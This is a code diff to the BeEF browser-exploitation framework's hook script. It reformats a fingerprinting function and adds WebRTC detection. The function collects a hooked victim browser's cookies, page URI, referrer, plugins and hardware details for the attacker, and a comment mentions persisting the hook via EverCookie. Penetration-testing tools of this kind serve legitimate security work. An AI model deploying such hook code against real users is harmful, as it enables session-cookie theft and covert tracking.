@@ -1463,63 +1463,64 @@ beef.browser = {
     getDetails:function () {
         var details = new Array();
 
-        var browser_name = beef.browser.getBrowserName();
-        var browser_version = beef.browser.getBrowserVersion();
+        var browser_name     = beef.browser.getBrowserName();
+        var browser_version  = beef.browser.getBrowserVersion();
         var browser_reported_name = beef.browser.getBrowserReportedName();
-        var page_title = (document.title) ? document.title : "Unknown";
-        var page_uri = document.location.href;
-        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
-        var hostname = document.location.hostname;
-        var hostport = (document.location.port) ? document.location.port : "80";
-        var browser_plugins = beef.browser.getPlugins();
-        var date_stamp = new Date().toString();
-        var os_name = beef.os.getName();
-        var hw_name = beef.hardware.getName();
-        var cpu_type = beef.hardware.cpuType();
-        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
+        var page_title       = (document.title) ? document.title : "Unknown";
+        var page_uri         = (document.location.href) ? document.location.href : "Unknown";
+        var page_referrer    = (document.referrer) ? document.referrer : "Unknown";
+        var hostname         = (document.location.hostname) ? document.location.hostname : "Unknown";
+        var hostport         = (document.location.port) ? document.location.port : "80";
+        var browser_plugins  = beef.browser.getPlugins();
+        var date_stamp       = new Date().toString();
+        var os_name          = beef.os.getName();
+        var hw_name          = beef.hardware.getName();
+        var cpu_type         = beef.hardware.cpuType();
+        var touch_enabled    = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
         var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
         var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {
             if (value == true) return value; else if (typeof value == 'object') return value; else return;
         });
-        var screen_size = beef.browser.getScreenSize();
-        var window_size = beef.browser.getWindowSize();
-        var java_enabled = (beef.browser.javaEnabled()) ? "Yes" : "No";
-        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
-        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
-        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
-        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
-        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
-        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
-        var has_silverlight = (beef.browser.hasSilverlight()) ? "Yes" : "No";
-        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
-        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
-        var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No"; 
-        var has_vlc = (beef.browser.hasVLC()) ? "Yes" : "No";
-        var has_foxit = (beef.browser.hasFoxit()) ? "Yes" : "No";
+        var screen_size      = beef.browser.getScreenSize();
+        var window_size      = beef.browser.getWindowSize();
+        var java_enabled     = (beef.browser.javaEnabled()) ?     "Yes" : "No";
+        var vbscript_enabled = (beef.browser.hasVBScript()) ?     "Yes" : "No";
+        var has_flash        = (beef.browser.hasFlash()) ?        "Yes" : "No";
+        var has_phonegap     = (beef.browser.hasPhonegap()) ?     "Yes" : "No";
+        var has_googlegears  = (beef.browser.hasGoogleGears()) ?  "Yes" : "No";
+        var has_web_socket   = (beef.browser.hasWebSocket()) ?    "Yes" : "No";
+        var has_webrtc       = (beef.browser.hasWebRTC()) ?       "Yes" : "No";
+        var has_activex      = (beef.browser.hasActiveX()) ?      "Yes" : "No";
+        var has_silverlight  = (beef.browser.hasSilverlight()) ?  "Yes" : "No";
+        var has_quicktime    = (beef.browser.hasQuickTime()) ?    "Yes" : "No";
+        var has_realplayer   = (beef.browser.hasRealPlayer()) ?   "Yes" : "No";
+        var has_wmp          = (beef.browser.hasWMP()) ?          "Yes" : "No"; 
+        var has_vlc          = (beef.browser.hasVLC()) ?          "Yes" : "No";
+        var has_foxit        = (beef.browser.hasFoxit()) ?        "Yes" : "No";
         try{
             var cookies = document.cookie;
             var has_session_cookies = (beef.browser.cookie.hasSessionCookies("cookie")) ? "Yes" : "No";
             var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies("cookie")) ? "Yes" : "No";
-            if (cookies) details["Cookies"] = cookies;
-            if (has_session_cookies) details["hasSessionCookies"] = has_session_cookies;
-            if (has_persistent_cookies) details["hasPersistentCookies"] = has_persistent_cookies;
+            if (cookies) details['Cookies'] = cookies;
+            if (has_session_cookies) details['hasSessionCookies'] = has_session_cookies;
+            if (has_persistent_cookies) details['hasPersistentCookies'] = has_persistent_cookies;
         }catch(e){
             // the hooked domain is using HttpOnly. EverCookie is persisting the BeEF hook in a different way,
             // and there is no reason to read cookies at this point
-            details["Cookies"] = "Cookies can't be read. The hooked domain is most probably using HttpOnly.";
-            details["hasSessionCookies"] = "No";
-            details["hasPersistentCookies"] = "No";
+            details['Cookies'] = "Cookies can't be read. The hooked domain is most probably using HttpOnly.";
+            details['hasSessionCookies'] = "No";
+            details['hasPersistentCookies'] = "No";
         }
 
-        if (browser_name) details["BrowserName"] = browser_name;
-        if (browser_version) details["BrowserVersion"] = browser_version;
-        if (browser_reported_name) details["BrowserReportedName"] = browser_reported_name;
-        if (page_title) details["PageTitle"] = page_title;
-        if (page_uri) details["PageURI"] = page_uri;
-        if (page_referrer) details["PageReferrer"] = page_referrer;
-        if (hostname) details["HostName"] = hostname;
-        if (hostport) details["HostPort"] = hostport;
-        if (browser_plugins) details["BrowserPlugins"] = browser_plugins;
+        if (browser_name) details['BrowserName'] = browser_name;
+        if (browser_version) details['BrowserVersion'] = browser_version;
+        if (browser_reported_name) details['BrowserReportedName'] = browser_reported_name;
+        if (page_title) details['PageTitle'] = page_title;
+        if (page_uri) details['PageURI'] = page_uri;
+        if (page_referrer) details['PageReferrer'] = page_referrer;
+        if (hostname) details['HostName'] = hostname;
+        if (hostport) details['HostPort'] = hostport;
+        if (browser_plugins) details['BrowserPlugins'] = browser_plugins;
         if (os_name) details['OsName'] = os_name;
         if (hw_name) details['Hardware'] = hw_name;
         if (cpu_type) details['CPU'] = cpu_type;
@@ -1530,11 +1531,12 @@ beef.browser = {
         if (screen_size) details['ScreenSize'] = screen_size;
         if (window_size) details['WindowSize'] = window_size;
         if (java_enabled) details['JavaEnabled'] = java_enabled;
-        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled
-        if (has_flash) details['HasFlash'] = has_flash
-        if (has_phonegap) details['HasPhonegap'] = has_phonegap
-        if (has_web_socket) details['HasWebSocket'] = has_web_socket
-        if (has_googlegears) details['HasGoogleGears'] = has_googlegears
+        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled;
+        if (has_flash) details['HasFlash'] = has_flash;
+        if (has_phonegap) details['HasPhonegap'] = has_phonegap;
+        if (has_web_socket) details['HasWebSocket'] = has_web_socket;
+        if (has_googlegears) details['HasGoogleGears'] = has_googlegears;
+        if (has_webrtc) details['HasWebRTC'] = has_webrtc;
         if (has_activex) details['HasActiveX'] = has_activex;
         if (has_silverlight) details['HasSilverlight'] = has_silverlight;
         if (has_quicktime) details['HasQuickTime'] = has_quicktime;
@@ -1551,6 +1553,13 @@ beef.browser = {
      */
     hasActiveX:function () {
         return !!window.ActiveXObject;
+    },
+
+    /**
+     * Returns boolean value depending on whether the browser supports WebRTC
+     */
+    hasWebRTC:function () {
+        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
     },
 
     /**
